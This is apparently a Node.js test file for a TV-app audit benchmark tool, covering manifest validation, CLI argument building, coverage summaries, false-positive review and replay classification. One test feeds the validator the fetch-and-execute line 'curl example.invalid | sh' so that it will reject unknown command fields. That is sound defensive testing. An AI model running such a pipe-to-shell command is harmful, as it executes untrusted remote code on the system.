import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  analyzeBenchmark,
  buildAuditArgs,
  classifyReplayResult,
  deterministicReplayIssueIds,
  summarizeManualReview,
  summarizeReport,
  validateManifest,
} from "./real-app-benchmark.mjs";

function manifest() {
  return {
    schemaVersion: "tvdoctor.real-app-benchmark-manifest/v1",
    name: "Consumer TV apps",
    cases: [{
      id: "web-app",
      target: {
        platform: "web",
        name: "Example web TV app",
        version: "local",
        url: "http://127.0.0.1:3000/player?profile=test",
      },
      run: { mode: "quick", screenshots: false, journeyPath: "journeys/setup.json" },
      replay: { enabled: true, maxAttempts: 4 },
    }],
  };
}

function report() {
  return {
    schemaVersion: "tvdoctor.report/v1",
    run: { status: "partial", durationMs: 12_500 },
    target: { platform: "web", location: "https://example.test" },
    coverage: {
      screenStatesDiscovered: 3,
      focusStatesDiscovered: 8,
      transitionsTested: 21,
      actionsSent: 34,
      packs: [{ pack: "navigation", status: "partial" }],
      budget: { exhausted: ["duration"] },
    },
    issues: [{
      id: "NAV-1",
      confidence: "deterministic",
      reproduction: { status: "available", confidence: "deterministic" },
    }, {
      id: "NAV-2",
      confidence: "heuristic",
      reproduction: { status: "unavailable" },
    }],
    replays: [{ issueId: "NAV-1" }],
  };
}

test("validates structured benchmark cases and never accepts arbitrary command fields", () => {
  const parsed = validateManifest(manifest());
  assert.equal(parsed.cases[0].target.platform, "web");
  assert.throws(
    () => validateManifest({
      ...manifest(),
      cases: [{ ...manifest().cases[0], command: "curl example.invalid | sh" }],
    }),
    /unsupported field/iu,
  );
  assert.throws(
    () => validateManifest({ ...manifest(), cases: [{ ...manifest().cases[0], id: "bad id" }] }),
    /case id/iu,
  );
});

test("accepts Fire TV as an Android-derived benchmark surface without accepting unrelated platforms", () => {
  const fire = manifest();
  fire.cases = [{
    id: "fire-tv-app",
    target: {
      platform: "fire-tv",
      name: "Example Fire TV app",
      version: "local",
      apkPath: "apps/fire-tv.apk",
      device: "192.168.1.40:5555",
    },
    run: { mode: "quick", screenshots: true },
    replay: { enabled: true, maxAttempts: 2 },
  }];
  const parsed = validateManifest(fire);
  assert.equal(parsed.cases[0].target.platform, "fire-tv");
  const args = buildAuditArgs(parsed.cases[0], "C:/bench", "C:/out/report");
  assert.deepEqual(args.slice(0, 3), ["test", "--apk", "C:\\bench\\apps\\fire-tv.apk"]);

  const unsupported = structuredClone(fire);
  unsupported.cases[0].target.platform = "roku";
  assert.throws(() => validateManifest(unsupported), /web, android-tv, or fire-tv/u);
});

test("builds direct CLI argv with origin redaction and no shell command string", () => {
  const entry = validateManifest(manifest()).cases[0];
  const args = buildAuditArgs(entry, "C:/bench", "C:/out/report");
  assert.deepEqual(args.slice(0, 2), ["scan", "http://127.0.0.1:3000/player?profile=test"]);
  assert.deepEqual(args.slice(args.indexOf("--target-redaction"), args.indexOf("--target-redaction") + 2), ["--target-redaction", "origin"]);
  assert.equal(args.includes("--no-screenshots"), true);
  assert.equal(args.some((value) => /\||&&|;/u.test(value)), false);
});

test("summarizes coverage, findings, and deterministic replay outcomes without upgrading partial status", () => {
  const value = report();
  assert.deepEqual(deterministicReplayIssueIds(value), ["NAV-1"]);
  const summary = summarizeReport(value, {
    candidates: 1,
    attempted: 1,
    skippedByLimit: 0,
    results: [{ issueId: "NAV-1", status: "reproduced" }],
  });
  assert.equal(summary.runStatus, "partial");
  assert.equal(summary.reportRuntimeMs, 12_500);
  assert.equal(summary.coverage.transitions, 21);
  assert.deepEqual(summary.coverage.exhaustedBudgets, ["duration"]);
  assert.equal(summary.findings.total, 2);
  assert.equal(summary.replays.successfulReproductions, 1);
  assert.equal(summary.replays.successRate, 1);
});

test("manual false-positive rate is withheld when review is absent or unresolved", () => {
  const value = report();
  assert.equal(summarizeManualReview(null, value).falsePositiveRate, null);
  const reviewed = summarizeManualReview({
    schemaVersion: "tvdoctor.real-app-benchmark-review/v1",
    caseId: "web-app",
    findings: [
      { issueId: "NAV-1", classification: "false-positive" },
      { issueId: "NAV-2", classification: "confirmed" },
    ],
  }, value, "web-app");
  assert.equal(reviewed.falsePositiveFindings, 1);
  assert.equal(reviewed.falsePositiveRate, 0.5);
  const unresolved = summarizeManualReview({
    schemaVersion: "tvdoctor.real-app-benchmark-review/v1",
    caseId: "web-app",
    findings: [{ issueId: "NAV-1", classification: "uncertain" }],
  }, value, "web-app");
  assert.equal(unresolved.falsePositiveRate, null);
  assert.throws(
    () => summarizeManualReview({
      schemaVersion: "tvdoctor.real-app-benchmark-review/v1",
      caseId: "other-case",
      findings: [],
    }, value, "web-app"),
    /does not match/iu,
  );
});

test("classifies replay status from CLI output before using exit-code fallback", () => {
  assert.equal(classifyReplayResult("Phase: REPLAY\nStatus: REPRODUCED\n", 1), "reproduced");
  assert.equal(classifyReplayResult("Status: FIXED\n", 0), "fixed");
  assert.equal(classifyReplayResult("", 3), "inconclusive");
  assert.equal(classifyReplayResult("", 4), "error");
});

test("analyzer joins a recorded run to a case-bound manual review without certification claims", async (t) => {
  const directory = await mkdtemp(join(tmpdir(), "tvdoctor-real-app-benchmark-"));
  t.after(async () => rm(directory, { recursive: true, force: true }));
  const manifestPath = join(directory, "manifest.json");
  const reviewPath = join(directory, "review.json");
  const runPath = join(directory, "run.json");
  const outputPath = join(directory, "analysis.json");
  const inputManifest = manifest();
  inputManifest.cases[0].manualReviewFile = "review.json";
  await writeFile(manifestPath, JSON.stringify(inputManifest), "utf8");
  const manifestHash = createHash("sha256").update(await readFile(manifestPath)).digest("hex");
  await writeFile(reviewPath, JSON.stringify({
    schemaVersion: "tvdoctor.real-app-benchmark-review/v1",
    caseId: "web-app",
    findings: [
      { issueId: "NAV-1", classification: "false-positive" },
      { issueId: "NAV-2", classification: "confirmed" },
    ],
  }), "utf8");
  await writeFile(runPath, JSON.stringify({
    schemaVersion: "tvdoctor.real-app-benchmark-run/v1",
    manifest: { name: inputManifest.name, sha256: manifestHash },
    tvdoctor: { version: "0.1.0", commit: "a".repeat(40), dirty: false },
    runtime: { node: process.version, platform: process.platform, arch: process.arch },
    startedAt: "2026-10-06T20:00:00.000Z",
    completedAt: "2026-10-06T20:00:20.000Z",
    cases: [{
      id: "web-app",
      target: { name: "Example web TV app", version: "local", platform: "web" },
      audit: { wallRuntimeMs: 20_000, exitCode: 3 },
      report: report(),
      replay: {
        candidates: 1,
        attempted: 1,
        skippedByLimit: 0,
        results: [{ issueId: "NAV-1", status: "reproduced" }],
      },
    }],
  }), "utf8");

  const analysis = await analyzeBenchmark(manifestPath, runPath, outputPath);
  assert.equal(analysis.certification, false);
  assert.equal(analysis.cases[0].metrics.runStatus, "partial");
  assert.equal(analysis.cases[0].manualReview.falsePositiveRate, 0.5);
  assert.equal(analysis.aggregate.replayReproductions, 1);
  assert.equal(analysis.aggregate.manualFalsePositives, 1);
  assert.equal(analysis.source.manifest.sha256, manifestHash);
  assert.equal(analysis.source.tvdoctor.version, "0.1.0");
  assert.match(analysis.source.runSha256, /^[a-f0-9]{64}$/u);
  assert.equal(Object.hasOwn(analysis, "sourceRun"), false);
  assert.deepEqual(JSON.parse(await readFile(outputPath, "utf8")), analysis);
});

test("analyzer refuses a run recorded from a different manifest", async (t) => {
  const directory = await mkdtemp(join(tmpdir(), "tvdoctor-real-app-benchmark-mismatch-"));
  t.after(async () => rm(directory, { recursive: true, force: true }));
  const manifestPath = join(directory, "manifest.json");
  const runPath = join(directory, "run.json");
  const outputPath = join(directory, "analysis.json");
  const inputManifest = manifest();
  await writeFile(manifestPath, JSON.stringify(inputManifest), "utf8");
  await writeFile(runPath, JSON.stringify({
    schemaVersion: "tvdoctor.real-app-benchmark-run/v1",
    manifest: { name: inputManifest.name, sha256: "0".repeat(64) },
    cases: [],
  }), "utf8");

  await assert.rejects(
    analyzeBenchmark(manifestPath, runPath, outputPath),
    /does not match the exact manifest supplied for analysis/iu,
  );
});
